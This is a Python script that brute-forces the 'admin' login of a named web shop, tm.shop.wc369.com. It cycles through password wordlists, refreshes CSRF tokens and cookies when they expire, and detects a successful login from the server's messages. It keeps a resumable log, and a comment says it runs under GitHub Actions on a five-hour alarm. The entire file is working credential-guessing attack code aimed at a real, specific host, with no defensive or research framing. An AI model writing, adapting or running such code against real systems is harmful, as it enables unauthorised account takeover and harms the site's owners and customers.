import os
import requests
import sys
import re
import signal
from bs4 import BeautifulSoup
from datetime import datetime

class CurrentData:
    def __init__(self):
        self._current_file_path = ''
        self._current_line_no = 0

    @property
    def current_file_path(self):
        return self._current_file_path

    @property
    def current_line_no(self):
        return self._current_line_no

    @current_file_path.setter
    def current_file_path(self, value):
        self._current_file_path = value

    @current_line_no.setter
    def current_line_no(self, value):
        self._current_line_no = value

current_data = CurrentData()

def send_post_request(password, line_no, csrf_token, cookie):
    url = "http://tm.shop.wc369.com/login"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "X-CSRF-TOKEN": csrf_token,
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "http://tm.shop.wc369.com",
        "Referer": "http://tm.shop.wc369.com/login",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": cookie
    }

    payload = 'account=admin&password=' + password

    response = requests.post(url, headers=headers, data=payload)
    response_json = response.json()
    current_data.current_line_no = line_no

    # print(f"Current file: {current_data.current_file_path}")

    # 检查是否为数据过期
    if response_json["code"] == 500 and response_json["msg"] == "\u8bf7\u6c42\u53d1\u751f\u9519\u8bef!":
        print(f"Password: {password} Cache is expired, updating and reposting...")
        return 0
    # 检查是否成功登录
    elif response_json["code"] != 500 and response_json["msg"] != "\u5bc6\u7801\u8f93\u5165\u4e0d\u6b63\u786e!":
        print(f"Password: {password} Response OK.")
        print(response.text)
        return 1

    print(f"Password: {password} Posted.")
    # print(response.text)
    return 2

def process_password_files_in_directory(directory):
    csrf_token, cookie = get_new_csrf_token_and_cookie()
    queue_file_path = read_queue_file()
    if current_data.current_file_path == '':
        current_data.current_file_path = queue_file_path[0]
        file_index = queue_file_path.index(current_data.current_file_path)
    else:
        if [current_data.current_file_path] in queue_file_path:
            file_index = queue_file_path.index([current_data.current_file_path])
        else:
            log_password_entry(2)
            sys.exit(0)

    index = 0

    # 遍历从curret_file_path后面的所有参数
    for file_path in queue_file_path[file_index:]:
        if index != 0:
            current_data.current_line_no = 0
        index += 1
        with open(file_path[0], "r") as file:
            passwords = file.read().splitlines()
            print(f"Current file: {file_path[0]}")
            current_data.current_file_path = file_path[0]
            for password in passwords[current_data.current_line_no:]:
                post_status = send_post_request(password, passwords.index(password), csrf_token, cookie)
                if post_status == 0:
                    csrf_token, cookie = get_new_csrf_token_and_cookie()
                    new_post_status = send_post_request(password, passwords.index(password), csrf_token, cookie)
                    if new_post_status == 1:
                        log_password_entry(0)
                        sys.exit(0)
                    elif new_post_status == 2:
                        continue
                elif post_status == 1:
                    log_password_entry(0)
                    sys.exit(0)
                elif post_status == 2:
                    continue
    log_password_entry(2)

def get_new_csrf_token_and_cookie():
    login_url = 'http://tm.shop.wc369.com/login'
    response = requests.get(login_url)

    # 获取csrf_token和cookie
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('meta', {'name': 'csrf-token'})['content']
    raw_cookie = response.cookies.get_dict()
    cookie = '; '.join([f"{key}={value}" for key, value in raw_cookie.items()])
    return csrf_token, cookie

def log_password_entry(status):
    # 记录日志以便保存记录
    now = datetime.now()
    log_entry = f"{now.strftime('%Y-%m-%d %H:%M:%S')} {current_data.current_file_path} {current_data.current_line_no}"
    if status == 1:
        log_entry = '[Process Timeout Suspended] ' + log_entry
        print("Already been running for 5 hours. Suspended and log recorded.")
    elif status == -1:
        log_entry = '[Process Ctrl+C Suspended] ' + log_entry
        print("Ctrl+C suspended and log recorded.")
    elif status == 0:
        log_entry = '[Correct Password Found] ' + log_entry
    elif status == 2:
        log_entry = '[All File Processed] ' + log_entry
        print("All files have been processed or log is incorrect. Log recorded.")
    else:
        log_entry = '[Process Exception Suspended] ' + log_entry

    with open("log.txt", "a") as log_file:
        log_file.write(log_entry + "\n")

def read_queue_file():
    queue = []
    if os.path.exists("queue.txt"):
        with open("queue.txt", "r") as queue_file:
            lines = queue_file.read().splitlines()
            for line in lines:
                file_path = line.split()
                queue.append(file_path)
        return queue
    else:
        write_queue_file(get_password_directory())
        return read_queue_file()

def write_queue_file(directory):
    with open("queue.txt", "w") as queue_file:
        for root, dirs, files in os.walk(directory):
            for file in files:
                if file.endswith(".txt"):
                    file_path = os.path.join(root, file)
                    queue_file.write(f"{file_path}\n")
        

def signal_handler(signum, frame):
    log_password_entry(1)
    sys.exit(0)

def get_password_directory():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(current_directory, "passwordDict")

def main():
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(18000)  # 5 hours 18000

    if os.path.exists("log.txt"):
        with open("log.txt", "r") as log_file:
            log_entries = log_file.read().splitlines()
            if log_entries:
                pattern = r'\[(.*?)\] \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2} (.*?) (\d+)'
                matches = re.findall(pattern, log_entries[-1])
                file_path, line_no = matches[0][1], matches[0][2]
                current_data.current_file_path, current_data.current_line_no = file_path, int(line_no)

    process_password_files_in_directory(get_password_directory())

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_password_entry(-1)
    except Exception as e: 
        print('[Exception]\n', e, f'\n[Help Information]\nCurrent file and password line: {current_data.current_file_path} {current_data.current_line_no}')
        print('Notice: Exception printing is only for GitHub Actions runtime, which should be disabled for local debugging!')
        log_password_entry(-2)